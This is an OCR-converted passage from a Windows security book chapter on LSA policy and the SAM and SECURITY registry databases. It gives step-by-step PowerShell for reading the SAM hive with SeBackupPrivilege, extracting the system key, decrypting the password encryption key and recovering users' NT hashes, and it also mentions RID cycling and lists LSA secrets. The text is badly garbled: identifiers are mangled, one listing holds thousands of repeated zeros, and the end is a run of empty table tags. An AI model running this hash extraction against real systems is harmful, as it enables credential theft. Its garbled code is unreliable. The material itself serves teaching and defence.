## Trusted Domain Objects

The final type of object in the SECURITY database is the trusted domain object. These objects describe the trust relationships between domains in a forest. Although the domain policy remote service was designed for use with domains prior to the introduction of Active Directory, it can still be used to query the trust relationships on a modern domain controller.

Listing 10-18 shows an example of how to open the policy on a domain controller and then query for the list of trusted domains.

```bash
PS> $policy = Get-IsaPolicy -ServerName "PRIMARYDC"
PS> Get-IsaTrustedDomain -Policy $policy -InfoOnly
   Name                     TrustDirection  TrustType
-----                          -----------------    -----------------
   engineering.mineral.local BiDirectional  Ulevel
   sales.mineral.local        BiDirectional  Ulevel
```

Listing 10-18: Enumerating trust relationships for a domain controller

To inspect and configure trust relationships, you should use Active Directory commands, not the domain policy remote service's commands.


Therefore, I won't dwell on these objects any further; we'll come back to the subject of inspecting trust relationships in the next chapter.

322    Chapter 10

---

NOTE

While trusted domains are securable objects, the security descriptors are not configurable through any of the remote service APIs, attempting this will generate an error. This is because the security is implemented by Active Directory, not the LSA.

## Name Lookup and Mapping

If you're granted LookupName access, the domain policy remote service will let you translate SIDs to names, and vice versa. For example, as shown in


Listing 10-19, you can specify one or more SIDs to receive the corresponding users and domains using the Get-IsaName PowerShell command. You can also specify a name and receive the SID using Get-IsaSid.

```bash
PS> $policy = Get-LsaPolicy -Access LookupNames
PS> Get-LsaName -Policy $policy -Sid "$-1-1-0", "$-1-5-32-544"
Domain   Name        Source   NameUse
------   -----   ---------  ---------
        Everyone      Account WellknownGroup
BUILTIN Administrators Account Alias
PS> Get-LsaSid -Policy $policy -Name "Guest" | Select-Object Sddl
Sddl
-S-1-5-21-1653919079-861867932-2690720175-501
```

Listing 10-19: Looking up a SID or a name from the policy

Before Windows 10, it was possible for an unauthenticated user to use the lookup APIs to enumerate users on a system, as the anonymous user was granted LookUpNames access. This was a problem because an attack calling RID cycling could brute-force valid users on the system. As you witnessed in Listing 10-14, current versions of Windows explicitly deny the LookUpNames access right. However, RID cycling remains a useful technique for authenticated non-administrator domain users, as non-administrators can't use the SAM remote service.

It's also possible to add mappings from SIDs to names, even if they're not well-known SIDs or registered accounts in the SAM database. The Win32 API LsaManageSdNameMapping controls this. It's used by the SCM (discussed in Chapter 3) to set up service-specific SIDs to control resource access, and you can use it yourself, although you'll encounter the following restrictions:

- • The caller needs SeTcbPrivilege enabled and must be on the same sys-
tem as the LSA.

• The SID to map must be in the NT security authority.

• The first RID of the SID must be between 80 and 111 (inclusive of those
values).

• You must first register a domain SID before you can add a child SID in
that domain.
---

You can call the LsaManageSidNameMapping API to add or remove mappings using the Add-NTSidName and Remove-NTSidName PowerShell commands.


Listing 10-20 shows how to add SID-to-name mappings to the LSA as an administrator.

```bash
# PS> $domain_sid = Get-NtSid -SecurityAuthority Nt -RelativeIdentifier 99
# PS> $user_sid = Get-NtSid -BaseId $domain_sid -RelativeIdentifier 1000
# PS> $domain = "CUSTOMDOMAIN"
# PS> $user = "USER"
# PS> Invoke-NtToken -System {
     # Add-NtSidName -Domain $domain -Sid $domain_sid -Register
     # Add-NtSidName -Domain $domain -Name $user -Sid $user_sid -Register
     # Use-NtObject($policy = Get-LsaPolicy) {
         Get-LsaName -Policy $policy -Sid $domain_sid, $user_sid
     }     # Remove-NtSidname -Sid $user_sid -Unregister
         Remove-NtSidName -Sid $domain_sid -Unregister
    }
    Domain        Name        Source      NameUse
                ---------       ---                    ---                    ---
    CUSTOMDOMAIN      Account Domain
    CUSTOMDOMAIN_USER     Account WellKnownGroup
```

Listing 10-20: Adding and removing SID-to-name mappings

We first define the domain SID with a RID of 99 ❶, then create a user SID based on the domain SID with a RID of 1000 ❷. We're impersonating the SYSTEM user, so we have the SetcDPrivilege privilege, which means we can use the Add-SDID@Home command with the Register parameter to add the mapping ❸. (Recall that you need to register the domain before adding the user.) We then use the policy to check the SID mappings for the LSA ❸. Finally, we remove the SID-to-name mappings to clean up the changes we've made ❹.

This concludes our discussion of the LSA policy. Let's now look at how the two configuration databases, SAM and SECURITY, are stored locally.

## The SAM and SECURITY Databases

You've seen how to access the SAM and SECURITY databases using the remote services. However, you'll find it instructive to explore how these databases are stored locally, as registry keys. By accessing the databases directly, you can obtain information not exposed by the remote services, such as password hashes.

### WARNING

These registry keys aren't designed to be accessed directly, so the way in which they store the user and policy configurations could change at any time. Keep in mind that the description provided in this section might no longer be accurate at the time you're reading it. Also, because direct access is a common technique used by malicious software, it's very possible that script code in this section that you attempt to run may be blocked by any antivirus product running on your system.

324    Chapter 10

---

## Accessing the SAM Database Through the Registry

Let's start with the SAM database, found in the registry at REGISTRY\


MACHINESAM. It's secured so that only the SYSTEM user can read and write to its registry keys. You could run PowerShell as the SYSTEM user with the Start- Win32ch3DProcess command and then access the registry that way, but there is a simpler approach.

As an administrator, we can bypass the read access check on the regis try by enabling $ebackupPrivilege. If we create a new object manager drive provider while this privilege is enabled, we can inspect the SAM database registry key using the shell. Run the commands in Listing 10-21 as an administrator.

```bash
PSP Enable-NtTokenPrivilege SeBackupPrivilege
  PSP New-PSDrive -PSProvider NToObjectManager -Name SEC -Root ntkey:MACHINE
  PSP ls -Depth 1 -Recurse SEC:\SAM\SAM
  Name                     TypeName
  -----                     ---------
  SAM\SAM\Domains      Key
  SAM\SAM\LastSkuUpgrade  Key
  SAM\SAM\RACT         Key
  0 SAM\SAM\Domains\Account Key
  0 SAM\SAM\Domains\Bulletin Key
```

Listing 10-21: Mapping the MACHINE registry key with SeBackupPrivileges and listing the SAM database registry key

We begin by enabling SeBackupPrivilege . With the privilege enabled, we can use the New-PSdrive command to map a view of the MACHINE registry key to the SEC drive. This enables the drive to use SeBackupPrivilege to circumvent security checking.

We can list the contents of the SAM database registry key using the normal PowerShell commands. The two most important keys are Account ❶ and Builtin ❷. The Account key represents the local domain we accessed using the SAM remote service and contains the details of local users and groups. The Builtin key contains the local built-in groups; for example, BUILTIN\Administrators.

## Extracting User Configurations

Let's use our access to the SAM database registry key to extract the configuration of a user account. Listing 10-22 shows how to inspect a user's configuration. Run these commands as an administrator.

```bash
-Item SEC:\SAM\SAM\Domains\Account\Users\000001F4 ❶
s ❸
    Type    DataObject
    ----- ---------
        Binary {3, 0, 1, 0...}
        Binary {0, 0, 0, 0...}
credentials Binary {0, 0, 0, 0...}
```

Windows Authentication  325

---

```bash
PS> function Get-VariableAttribute($key, [int]$Index) {
    $MaxAttr = 0x11
    $V = $key["V".Data
    $base_offs = $Index * 12
    $curr_offs = [System.BitConverter::ToInt32($V, $base_offs) + ($MaxAttr * 12)
    $len = [System.BitConverter::ToInt32($V, $base_offs + 4)
   if ($len -gt 0) {
       $V[$curr_offs..($curr_offs+$len-1)]
     } else {
       @()
    }
PS> $sd = Get-VariableAttribute $key -Index 0 ⊕
PS> New-NtSecurityDescriptor -Byte $sd
Owner                DACL ACE Count SACL ACE Count Integrity Level
----- ----------------------------- -------------------------------
BUILTIN\Administrators 4                   2                     NONE
PS> Get-VariableAttribute $key -Index 1 | Out-HexDump -ShowAll ⊕
00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - O123456789ABCDEF
----------------------
00000000: 41 00 64 60 00 69 00 6E 00 69 00 73 00 74 00  - A.d.m.i.n.i.s.t.
00000010: 72 00 61 00 74 00 6F 00 72 00                          - r.a.t.o.r.
PS> $lm = Get-VariableAttribute $key -Index 13 ⊕
PS> $lm | Out-HexDump -ShowAddress
00000000: 03 00 02 00 00 00 00 00 00 48 70 18 49 1A A4 F9 36
00000010: 81 F7 4D 52 8A 1B A5 D0
PS> $mt = Get-VariableAttribute $key -Index 14 ⊕
PS> $mt | Out-HexDump -ShowAddress
00000000: 03 00 02 00 10 00 00 00 CA 15 AB DA 31 00 2A 72
00000000: 6E 4B CE 89 27 7E A6 F6 DB 19 CE B7 58 AC 93 F5
00000020: D1 89 73 FB B2 C3 AA 41 95 FE 6F F8 B7 58 37 09
00000030: 0D 4B E2 4C DB 37 3F 91
```

Listing 10-22: Displaying data for the default administrator user

The registry key stores user information in keys where the name is the hexadecimal representation of the user's RID in the domain. For example, in Listing 10-22, we query for the Administrator user, which always has a RID of 500 in decimal. Therefore, we know it will be stored in the key 000001f4, which is the RID in hexadecimal ❶ . You could also list the Users key to find other users.

The key contains a small number of binary values 0 . In this example, we have three values: the F value, which is a set of fixed-sized attributes for the user; V , which is a set of variable-sized attributes; and SupplementalCredentials , which could be used to store credentials other than the NT hash, such as online accounts or biometric information.

---

At the start of the variable-sized attributes value is an attribute index table. Each index entry has an offset, a size, and additional flags. The important user data is stored in these indexes:

Index 0 The user object's security descriptor ❸ Index 1 The user's name ❸ Index 13 The user's LM hash ❸ Index 14 The user's NT hash ❸

The LM and NT hash values aren't stored in plaintext; the LSA obfucates them using a couple of different encryption algorithms, such as RC4 and Advanced Encryption Standard (AES). Let's develop some code to extract the hash values for a user.

## Extracting the System Key

In the original version of Windows NT, you needed only the SAM database registry key to decrypt the NT hash. In Windows 2000 and later, you need an additional key, the ISA system key, which is hidden inside the SYSTEM registry key. This key is also used as part of the obfuscation mechanism for values in the SECURIY database registry key.

The first step to extracting an NT hash is extracting the system key into a form we can use. Listing 10-23 shows an example.

```bash
PS> function Get-LsaSystemKey {
  ¶ $names = "JD", "$skew", "GBG", "Data"
    $keybase = "NKey:WACHINESYSTEM\CurrentControlSet\Control\lsa"
    $key = $names | ForEach-Object {
      $key = Get-Item "$keybase$.|
      @ $key.ClassName | ConvertFrom-HexDump
    ¶ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 |
  ForEach-Object {
                $key[5, ]
@ P5> Get-LsaSystemKey | Out-HexDump
  3E 98 06 D8 E3 C7 12 88 99 CF F4 1D 5E DE 7E 21
```

Listing 10-23: Extracting the obfuscated LSA system key

The key is stored in four separate parts inside the LSA configuration key ❶ . To add a layer of obfuscation, the parts aren't stored as registry values; instead, they're hexadecimal text strings stored in the rarely used registry key class name value. We can extract these values using the ClassName property and then convert them to bytes ❷ .

We must then permute the boot key's byte values using a fixed ordering to generate the final key ❸. We can run the Get-LSasSystemKey PowerShell command to display the bytes ❹. Note that the value of the key is system specific, so the output you see will almost certainly be different.

Windows Authentication  327

---

One interesting thing to note is that getting the boot key doesn't require administrator access. This means that an arbitrary file-read vulnerability could enable a non-administrator to extract the registry hive files backing the SAM and SECURITY registry keys and decrypt their contents (which doesn't seem like a particularly good application of defense in depth).

## Decrypting the Password Encryption Key

The next step in the deobfuscation process is to decrypt the password encryption key (PEK) using the system key. The PEK is used to encrypt the user hash values we extracted in Listing 10-22. In Listing 10-24, we define the function to decrypt the PEK.

```bash
PS> function Unprotect-PasswordEncryptionKey {
  } $key = Get-Item SEC:\SAM\SAM\Domains\Account
    $fval = $key["F"].Data
  } $sectype = [BitConverter]::ToInt32($fval, 0x68)
    $endofs = [BitConverter]::ToInt32($fval, 0x6C) + 0x68
    $data = $fval\070..($endofs-1)
  } switch($sectype) {
      1 { Unprotect-PasswordEncryptionKeyRC4 -Data $data }
      2 { Unprotect-PasswordEncryptionKeyAES -Data $data
        default { throw "Unknown password encryption format" }
    }
}
```

Listing 10-24: Defining the Unprotect-PasswordEncryptionKey decryption function

First we query the registry value ❶ that contains the data associated with the PEK. Next, we find the encrypted PEK in the fixed-attribute registry variable at offset 0x68 (remember that this location could change). The first 32-bit integer represents the type of encryption used, either RC4 or AES128. The second 32-bit integer is the length of the trailing encrypted PEK. We extract the data and then call an algorithm-specific decryption function ❸ .

Let's look at the decryption functions. Listing 10-25 shows how to decrypt the password using RC4.

```bash
○ PS> function Get-MD5Hash([byte[]])$Data) {
        $md5 = [System.Security.Cryptography.MD5]::Create()
        $md5.ComputeHash($Data)
} PS> function Get-StringBytes([string]$String) {
    [System.Text.Encoding]::ASCII.GetBytes($string + "\0")
}
PS> function Compare-Bytes([byte[]])$Left, [byte[]]$Right) {
    [Convert]::ToBase64String($Left) -eq [Convert]::ToBase64String($Right)
}
```

---

```bash
# PS! function Unprotect-PasswordEncryptionKeyRc4(byte[])$Data {
    } $key = Get-LsaSystemKey
        $jw = Get-StringBytes '$#%$%^$()qwertyUOPAxcvbm=QQOO00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 10-25: Decrypting the password encryption key using RC4

We start by creating some helper functions for the decryption process, such as Get-MD5hash, which calculates an MD5 hash ❶. We then start the decryption ❷. The $Data parameter that we pass to the @protect-Password EncryptionKeyBC function is the value extracted from the fixed-attribute buffer.

The function constructs a long binary string containing the first 16 bytes of the encrypted data (an initialization vector, used to randomize the encrypted data), along with two fixed strings and the system key ❸.

The binary string is then hashed using the MD5 algorithm to generate a key for the RC4 encryption, which we use to decrypt the remaining 32 bytes of the encrypted data . The first 16 decrypted bytes are the PEK, and the second 16 bytes are an MD5 hash used to verify that the decryption was correct. We check the hash value ❸ to make sure we've successfully decrypted the PEK. If the hash value is not correct, we'll throw an exception to indicate the failure.

In Listing 10-26, we define the functions for decrypting the PEK using AES.

```bash
⊙ PS> function Unprotect-AES([byte[]]$Data, [byte[]]$IV, [byte[]]$Key) {
        $$aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = "CBC"
        $aes.Padding = "PKCS7"
        $aes.Key = $Key
        $aes.IV = $IV
        $aes.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length)
    }
  PS> function Unprotect-PasswordEncryptionKeyAES([byte[]]$Data) {
    ○ $syskey = Get-LsaSystemKey
     ○ $hash_len = [System.BitConverter]::ToInt32($Data, 0)
     ○ $enc_len = [System.BitConverter]::ToInt32($Data, 4)
    ○ $iv = $Data[0x8..0x17]
```

---

```bash
$pek = Unprotect-AES -Key $syskey -IV $iv -Data
    $Data[0x18..(0x18+sec_len-1)]
     @ $hash_ofs = 0x18+sec_len
     $hash_data = $Data[$hash_ofs..($hash_ofs+$hash_len-1)]
     $hash = Unprotect-AES -Key $syskey -IV $iv -Data $hash_data
     @ $sha256 = [System.Security.Cryptography.HSA256::Compute()
        $pek_hash = $sha256.ComputeHash($pek)
        if (!(Compare-Bytes $hash $pek_hash)) {
            throw "Invalid password key for AES."
        }
    $pek
```

Listing 10-26: Decrying the password encryption key using AES

We start by defining a function to decrypt an AES buffer with a specified key and initialization vector (IV) ❹ . The decryption process uses AES in cipher block chaining (CBC) mode with PKCS7 padding. I recommend looking up how these modes function, but their exact details are unimportant for this discussion; just be aware that they must be set correctly or the decryption process will fail.

Now we define the password decryption function. The key used for AES is the system key, ❸, with the IV being the first 16 bytes of data after a short header ❹ and the encrypted data immediately following. The length of the data to decrypt is stored as a value in the header.

As with RC4, the encrypted data contains an encrypted hash value we can use to verify that the decryption succeeded. We decrypt the value & and then generate the SHA256 hash of the PEK to verify it ❸. If the decryption and verification succeeded, we now have a decrypted PEK.

In Listing 10-27, we use the Unprotect-PasswordEncryptionKey function to decrypt the password key.

```bash
PS> Unprotect-PasswordEncryptionKey | Out-HexDump
PS 159 80 6A 50 D9 CA BE C7 EA 6D CS 76 C3 7A C5
```

Listing 10-27: Testing the password encryption key decryption

Again, the actual value generated should look different on different systems. Also note that the PEK is always 16 bytes in size, regardless of the encryption algorithm used to store it.

## Decrypting a Password Hash

Now that we have the PEK, we can decrypt the password hashes we extracted from the user object in Listing 10-22. Listing 10-28 defines the function to decrypt the password hash.

```bash
__________________________________________________________________________________
PS> function Unprotect-PasswordHash([byte[]]&Key, [byte[]]&Data,
[int]&Rid, [int]&Type) {
    $enc_type = [BitConverter]::ToInt16($Data, 2)
```

330    Chapter 10

---

```bash
switch($enc_type) {
      1 { Unprotect-PasswordHashRC4 -Key $Key -Data $Data -Rid $Rid
-Type $Type }  \\
      2 { Unprotect-PasswordHashAES -Key $Key -Data $Data }
        default { throw "Unknown hash encryption format" }
    }
  }
```

Listing 10-28: Decrypting a password hash

The Unprotect-PasswordHash function takes as arguments the PEK we decrypted, the encrypted hash data, the RID of the user, and the type of hash. LM hashes have a Type value of 1, while NT hashes have a Type value of 2.

The hash data stores the type of encryption; as with the PEK, the supported encryption algorithms are RC4 and AES128. Note that it's possible for the PEK to be encrypted with RC4 and the password hash with AES, or vice versa. Allowing a mix of encryption types lets systems migrate old hash values from RC4 to AES when a user changes their password.

We call the algorithm-specific decryption function to decrypt the hash.


Note that only the RC4 decryption function needs us to pass it the RID and


type of hash; the AES128 decryption function doesn't require those two values.

We'll implement the RC4 hash decryption first, in Listing 10-29.

```bash
PS> function Unprotect-PasswordHashRC4([byte[]]&Key, [byte[]]&Data,
    [int]&Rid, [int]&Type)
   ⚐ if ($Data.length -lt 0x14) {
        return @()
    }   ⚐ $iv = switch($type) {
        1 { "LMPASSWORD" }
        2 { "NTPASSWORD" }
        3 { "LMPASSWORDHISTORY" }
        4 { "NTPASSWORDHISTORY" }
        5 { "MISCREDDATA" }
    }   ⚐ $key_data = $key + [BitConverter]::GetBytes($Rid) + (Get-StringBytes $iv)
        $rc4_key = Get-MD5Hash -Data $key_data
   ⚐ Unprotect-RC4 -Key $rc4_key -Data $Data -Offset 4 -Length 16
```

Listing 10-29: Decrypting a password hash using RC4

We first check the length of the data ❶ . If it's less than 20 bytes in size, we assume the hash isn't present. For example, the LM hash is not stored by default on modern versions of Windows, so attempting to decrypt that hash will return an empty array.

Assuming there is a hash to decrypt, we then need an IV string based on the type of hash being decrypted . In addition to LM and NT hashes, the LSA can decrypt a few other hash types, such as the password history, which stores previous password hashes to prevent users from changing back to an old password.

---

We build a key by concatenating the PEK, the RID in its byte form, and the IV string and using it to generate an MD5 hash ❸. We then use this new key to finally decrypt the password hash ❹.

Decrypting the password using AES is simpler than with RC4, as you can see in Listing 10-30.

```bash
PS> function Unprotect-PasswordHashAES([byte[]]$Key, [byte[]]$Data) {
  @ $length = [BitConverter]::ToInt32($Data, 4)
   if ($length -eq 0) {
      return @()
    }
  @ $IV = $Data[8..0x17]
    $value = $Data[0x17:($Data.Length-1)]
  @ Unprotect-AES -Key $key -IV $IV -Data $value
```

Listing 10-30: Decrypting a password hash using AES

The password contains the data length, which we use to determine if we need to return an empty buffer ❶ . We can then extract the EV ❷ and the encrypted value from the buffer and decrypt the value using the PEK ❸ .

Listing 10-31 decrypts the LM and NT hashes.

```bash
PS> $pek = Unprotect-PasswordEncryptionKey
PS> $lm_dec = Unprotect-PasswordHash -Key $pek -Data $lm -Rid 500 -Type 1
PS> $lm_dec | Out-HexDump
PS> $nt_dec = Unprotect-PasswordHash -Key $pek -Data $nt -Rid 500 -Type 2
PS> $nt_dec | Out-HexDump
40 75 5C F0 7C B3 A7 17 46 34 D6 21 63 CE 7A DB
```

Listing 10-31: Decrypting the LM and NT hashes

Note that in this example there is no LM hash, so the decryption process returns an empty array. ❶. However, the NT hash decrypts to a 16-byte value ❷.

## Deobfuscating the Password Hash

We now have a decrypted password hash, but there is one final step we need to perform to retrieve the original hash. The password hash is still encrypted with the Data Encryption Standard (DES) algorithm. DES was the original obfuscation mechanism for hashes in the original version of NT before the introduction of the system key. All this RC4 and AES decryption merely got us back to where we started.

We first need to generate the DES keys to decrypt the hash value (Listing 10-32).

```bash
PS> function Get-UserDESKey([uint32]&RID) {
    $ba = [System.BitConverter::GetBytes($RID)
        $key2 = ConvertTo-DESK $ba[2], $ba[1], $ba[0], $ba[3], $ba[2], $ba[1],
$ba[0]
        $key2 = ConvertTo-DESK $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], $ba[0],
```

332     Chapter 10

---

```bash
$ba[3]
    $key1, $key2
}
PS> function ConvertTo-DESKey([byte[])&key) {
    $k = [System.BitConverter]::ToUInt64($key + 0, 0)
    for($i = 7; $i - ge 0; $i--) {
        $curr = ($k - shr ($i * 7)) -band 0x7F
        $b = $curr;
        $b = $b -bxor ($b -shr 4)
        $b = $b -bxor ($b -shr 2)
        $b = $b -bxor ($b -shr 1)
        $(curr -shr 1) -bxor ($b -band 0x1) -bxor 1
    }
}
```

Listing 10-32: Generating the DES keys for the RID

The first step in decrypting the hash is to generate two 64-bit DES keys based on the value of the RID. In Listing 10-32, we unpack the RID into two 56-bit arrays as the base for the two keys. We then expand each 56-bit array to 64 bits by taking each 7 bits of the array and calculating a parity bit for each byte. The parity bit is set in the least significant bit of each byte, to ensure that each byte has an odd number of bits.

With the two keys, we can decrypt the hash fully. First we'll need a few functions, which we define in Listing 10-33.

```bash
PS> function Unprotect-DES([byte[]]&Key, [byte[]]&Data, [int]&Offset) {
   $des = [Security.Cryptography.DES]::Create()
   $des.Key = $key
   $des.Mode = "ECB"
   $des.Padding = "None"
   $des.CreateDecryptor().TransformFinalBlock($Data, $Offset, 8)
}
PS> function Unprotect-PasswordHasDES([byte[]]&Hash, [uint32]&Kid) {
   $keys = Get-User&DsKey -Rid -$rid
   (Unprotect-DES -Key $keys[0] -Data $Hash -Offset 0) +
   (Unprotect-DES -Key $keys[1] -Data $Hash -Offset 8)
```

Listing 10-33: Decrypting password hashes using DES

We start by defining a simple DES decryption function. The algorithm uses DES in electronic code book (ECB) mode with no padding. We then define a function to decrypt the hash. The first 8-byte block is decrypted with the first key, and the second with the second key. Following that, we concatenate the decrypted hash into a single 16-byte result.

Finally, we can decrypt the password hash and compare it against the real value, as shown in Listing 10-34 .

```bash
PS> Unprotect-PasswordHashDES -Hash 5mt -Dec - RID 500 | Out-HexDump
51a 1A 3b 26 2C B6 D9 32 0E 9E 8B 43 15 8D 85 22
```

Windows Authentication  333

---

```bash
PS> Get-MDHash -String "adn+pw" | Out-HexDump
51 1A 38 26 2C B6 D9 32 0E 9E 88 43 15 8D 85 22
```

Listing 10-34: Verifying the NT hash

If the hash was correctly decrypted, we should expect it to match the MD4 hash of the user's password. In this case, the user's password was set to adminpub (I know, not strong). The decrypted NT hash and the generated hash match exactly.

Let's now look at the SECURITY database, which stores the LSA policy. We won't spend much time on this database, as we can directly extract most of its information using the domain policy remote service described earlier in the chapter.

## Inspecting the SECURITY Database

The LSA policy is stored in the SECURITY database registry key, which is located at REGISTRY/MACHINECSECURITY. As with the SAM database registry key, only the SYSTEM user can access the key directly, but we can use the mapped drive provider from Listing 10-21 to inspect its contents.

Listing 10-35 shows a few levels of the SECURITY database registry key. Run this command as an administrator.

```bash
PS> ls -Depth 1 -Recurse SEC:\SECURITY
SECURITY\Cache
SECURITY\Policy
SECURITY\RXACT
SECURITY\SAM
SECURITY\Policy\Accounts
SECURITY\Policy\CompletedPrivilegeUpdates Key
SECURITY\Policy\Def quota
SECURITY\Policy\Domains
SECURITY\Policy\LastPassCompleted
SECURITY\Policy\PoIAcDmN
SECURITY\Policy\PoIAcDmS
SECURITY\Policy\PoIAdtEv
SECURITY\Policy\PoIAdtIg
SECURITY\Policy\PoIDnDDN
SECURITY\Policy\PoIDnDMG
SECURITY\Policy\PoIDnTrN
SECURITY\Policy\PoIKList
SECURITY\Policy\PoIMachineAccountR
SECURITY\Policy\PoIMachineAccountS
SECURITY\Policy\PoIOldSyskey
SECURITY\Policy\PoIPrmDN
SECURITY\Policy\PoIPrmDS
SECURITY\Policy\PoIRevision
SECURITY\Policy\SecDesc
SECURITY\Policy\Secrets
SECURITY\Policy\Secs
```

Listing 10-35: Listing the contents of the SECURITY database registry key

We'll discuss only a few of these registry keys. The Cache key ❶ contains a list of cached domain credentials that can be used to authenticate a user.

334    Chapter 10

---

even if access to the domain controller is lost. We'll cover the use of this key in Chapter 12, when we discuss interactive authentication.

The SAM key ❸ is a link to the full SAM database registry key whose contents we showed in Listing 10-21. It exists here for convenience. The PolicyAccounts key ❸ is used to store the account objects for the policy. The Policy key also contains other system policies and configuration; for example, PolAddEv❸ and PolAddLtl ❸ contain configurations related to the system's audit policy, which we analyzed in Chapter 9.

The security descriptor that secures the policy object is found in the PolicySetDesc key ❶ . Each securable object in the policy has a similar key to persist the security descriptor.

Finally, the PolicySecrets key is used to store secret objects. We dig further into the children of the Secrets key in Listing 10-36. You'll need to run these commands as an administrator.

```bash
#! PS> ls SEC:\SECURITY\Policy\Secrets
        Name       TypeName
        ----- ---------
$MACLINE_ACC Key
  DPAPI_SYSTEM Key
  NL$KM      Key
#! PS> ls SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM
        Name    TypeName
        ----- ---------
  CupdTime Key
  CurrVal  Key
  OldVal   Key
  OupdTime Key
  SecDesc  Key
  PS: $key = Get-Item SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal
  01: $key.DefaultValue.Data | Out-HexDump -ShowAll
                          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F .. - 0123456789ABCDEF
                             --------------------
     00000000: 00 00 00 01 5F 5D 25 70 36 13 17 41 92 57 50 F5 .. - .....%p6..A.W.P
     00000010: 89 EA AA 35 03 00 00 00 00 00 00 00 DF D6 A4 60 .. - -5.......</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>